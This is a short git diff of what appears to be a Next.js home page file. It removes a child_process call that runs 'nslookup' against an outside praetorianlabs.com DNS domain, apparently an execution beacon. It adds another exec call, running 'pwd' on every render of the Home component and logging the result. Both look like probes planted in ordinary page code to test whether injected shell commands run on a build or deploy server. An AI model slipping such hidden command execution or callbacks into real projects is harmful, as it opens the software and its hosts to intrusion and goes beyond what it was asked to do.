@@ -3,19 +3,6 @@ import styles from '../styles/Home.module.css';
 import Post from '../components/Post';
 const { exec } = require("child_process");
 
-
-exec("nslookup wpecommand.dns.praetorianlabs.com", (error, stdout, stderr) => {
-    if (error) {
-        console.log(`error: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.log(`stderr: ${stderr}`);
-        return;
-    }
-    console.log(`stdout: ${stdout}`);
-});
-
 const POSTS = [
   {
     id: 'cG9zdDoxMA==',
@@ -56,6 +43,19 @@ const POSTS = [
 ];
 
 export default function Home() {
+
+  exec("pwd", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+  });
+
   return (
     <div className={styles.container}>
       <Head>
